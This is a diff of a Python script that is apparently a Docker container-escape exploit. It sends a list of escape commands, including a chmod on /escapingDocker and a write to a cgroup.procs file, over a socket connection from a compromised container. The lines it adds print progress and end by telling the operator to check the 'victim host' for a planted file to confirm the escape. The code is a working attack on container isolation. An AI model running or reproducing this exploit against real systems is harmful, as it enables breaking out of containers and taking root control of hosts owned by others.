@@ -67,8 +67,12 @@ def listen(ip, port, general_info):
 			 'chmod a+x /escapingDocker\n',
 			 'sh -c "echo \$$ > /tmp/cgroup_mount/test/cgroup.procs"\n']
 		print(color.GREEN + "\n\n\n[*]" + color.END + " Executing Exploit, please wait")
+		# Wait for threads
+		time.sleep(0.7)
+		print(color.GREEN + '[*]' + color.END + ' Proceeding with Docker escape:')
 		for cmd in escape:
 			# Avoid stalling for ever
+			print('\t' + color.BOLD + cmd.replace('\n', '') + color.END, end =" ")
 			conn.settimeout(0.6)
 			try:
 				ans = conn.recv(4194304).decode()
@@ -76,10 +80,11 @@ def listen(ip, port, general_info):
 			except socket.timeout:
 				# This will happen once we open the root shell because the input will be empty
 				pass
-			
+			print(color.GREEN + ' [✓]' + color.END)
 			conn.settimeout(None)
 			conn.send(cmd.encode())
 			time.sleep(0.30)
+		print(color.GREEN + '\n[*]' + color.END + color.BOLD +' Done!\nTo confirm the attack was successful, on the victim host, check the existence of the file /File_on_Host\n' + color.END)
 		cleanup(conn, general_info)
 	
 	except KeyboardInterrupt:
